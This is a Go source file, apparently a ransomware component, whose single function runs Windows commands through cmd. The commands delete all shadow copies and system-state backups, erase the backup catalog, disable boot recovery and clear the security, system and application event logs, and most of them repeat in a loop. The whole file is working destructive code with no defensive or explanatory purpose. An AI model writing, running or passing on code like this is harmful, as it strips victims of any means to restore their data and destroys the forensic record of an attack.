package Delete_VSSADMIN

import (
	"fmt"
	"os/exec"
)

func Delete_VSSADMIN() {
	// "C:\Windows\System32\cmd.exe" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
	// vssadmin delete shadows /all /quiet
	// wmic shadowcopy delete
	// bcdedit /set {default} bootstatuspolicy ignoreallfailures
	// bcdedit /set {default} recoveryenabled no
	// wbadmin delete catalog -quiet
	c1 := exec.Command("cmd", "/c", "vssadmin", "delete", "shadows", "/all", "/quiet", "&", "wmic", "shadowcopy", "delete", "&", "bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures", "&", "bcdedit", "/set", "{default}", "recoveryenabled", "no", "&", "wbadmin", "delete", "catalog", "-quiet") //"C:\Windows\System32\cmd.exe" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet
	if err := c1.Run(); err != nil {
		fmt.Println("Error: ", err)
	}
	for i := 0; i < 3; i++ {
		// "C:\Windows\System32\cmd.exe" /c vssadmin Delete Shadows /All /Quiet
		c2 := exec.Command("cmd", "/c", "vssadmin", "Delete", "Shadows", "/All", "/Quiet")
		if err := c2.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c bcdedit /set {default} recoveryenabled No
		c3 := exec.Command("cmd", "/c", "bcdedit", "/set", "{default}", "recoveryenabled", "No")
		if err := c3.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c bcdedit /set {default} bootstatuspolicy ignoreallfailures
		c4 := exec.Command("cmd", "/c", "bcdedit", "/set", "{default}", "bootstatuspolicy", "ignoreallfailures")
		if err := c4.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c wbadmin DELETE SYSTEMSTATEBACKUP
		c5 := exec.Command("cmd", "/c", "wbadmin", "DELETE", "SYSTEMSTATEBACKUP")
		if err := c5.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest
		c6 := exec.Command("cmd", "/c", "wbadmin", "DELETE", "SYSTEMSTATEBACKUP", "-deleteOldest")
		if err := c6.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c wmic SHADOWCOPY /nointeractive
		c7 := exec.Command("cmd", "/c", "wmic", "SHADOWCOPY", "/nointeractive")
		if err := c7.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c wevtutil cl security
		c8 := exec.Command("cmd", "/c", "wevtutil", "cl", "security")
		if err := c8.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c wevtutil cl system
		c9 := exec.Command("cmd", "/c", "wevtutil", "cl", "system")
		if err := c9.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
		// "C:\Windows\System32\cmd.exe" /c wevtutil cl application
		c10 := exec.Command("cmd", "/c", "wevtutil", "cl", "application")
		if err := c10.Run(); err != nil {
			fmt.Println("Error: ", err)
		}
	}

}
